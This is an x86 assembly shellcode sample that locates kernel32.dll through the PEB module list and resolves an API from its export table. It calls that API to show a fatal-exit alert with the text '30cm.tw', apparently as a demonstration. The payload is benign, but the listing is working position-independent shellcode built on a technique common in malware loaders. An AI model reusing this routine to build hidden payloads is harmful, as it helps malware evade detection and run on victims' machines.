// x86 Shellcode FatalExit() alert by aaaddress1
	mov edx, dword ptr fs:[0x30]
	mov edx, dword ptr [edx+0x0c]
	mov edx, dword ptr [edx+0x0c] // PEB->Ldr->InLoadOrderModuleList

find_module:
	// current edx point to LDR_DATA_TABLE_ENTRY
	mov eax, dword ptr [edx+0x18] // LDR_DATA_TABLE_ENTRY.DllBase
	lea esi, [edx+0x2c] // point to (UNICODE_STRING*)BaseDllName
	mov esi, dword ptr [esi+0x04] // esi = (char *)BaseDllName->Buffer
	mov edx, dword ptr [edx] // edx = edx->InLoadOrderModuleList->flink
	cmp byte ptr [esi+0x0c], 0x33 // Kernel32
	jne find_module

parse_eat:
	mov edi, eax // edi = DllBase of Kernel32.dll
	add edi, dword ptr [eax+0x3c] // DllBase + DosHdr->e_lfanew = NtHdr
	mov edx, dword ptr [edi+0x78] // edx = Export Table RVA
	add edx, eax // edx = Export Table Virtual Address
	mov edi, dword ptr [edx+0x20] // edi = AddressOfNames RVA
	add edi, eax // edi point to AddressOfNames Virtual Address

	xor ebp, ebp // counter
lookup_api:
	mov esi, dword ptr [edi+ebp*4]
	add esi, eax
	inc ebp
	cmp dword ptr [esi+0x08], 0x74697845 // FatalExit
	jne lookup_api

get_offset_by_ord:
	mov edi, dword ptr [edx+0x24] // edi = AddressOfNameOrdinals RVA
	add edi, eax // edi point to AddressOfNameOrdinals Virtual Address
	mov bp, word ptr [edi+ebp*2]  // get function ordinal number
	mov edi, dword ptr [edx+0x1c] // edi = AddressOfFunctions RVA
	add edi, eax // edi point to AddressOfFunctions Virtual Address
	dec ebp
	mov edi, dword ptr [edi+ebp*4] // edi = function offset
	add edi, eax
	push 0x0077742e
	push 0x6d633033
	push esp
	push 0
	call edi